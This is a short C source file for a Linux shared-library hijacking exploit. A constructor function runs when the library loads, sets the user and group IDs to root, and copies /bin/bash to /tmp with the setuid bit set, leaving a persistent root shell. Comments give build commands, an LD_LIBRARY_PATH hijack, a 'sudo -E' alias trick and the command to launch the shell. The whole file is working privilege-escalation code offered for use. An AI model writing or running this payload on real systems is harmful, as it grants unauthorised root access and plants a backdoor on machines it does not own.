#include <stdio.h>
#include <stdlib.h>
#include <unistd.h> // for setuid/setgid

// gcc -Wall -fPIC -c -o hax.o hax.c
// gcc -shared -o libhax.so hax.o

//export LD_LIBRARY_PATH=/home/{user}/ldlib
//maybe alias sudo="sudo -E"
// On the system ldd /bin/netstat
// /tmp/bash -p

static void runmahpayload() __attribute__((constructor)); // Inform compiler about the constructor attribute

void runmahpayload() {
    setuid(0);
    setgid(0);
    printf("DLL HIJACKING IN PROGRESS \n");
    system("cp /bin/bash /tmp/bash; chmod +s /tmp/bash");
}
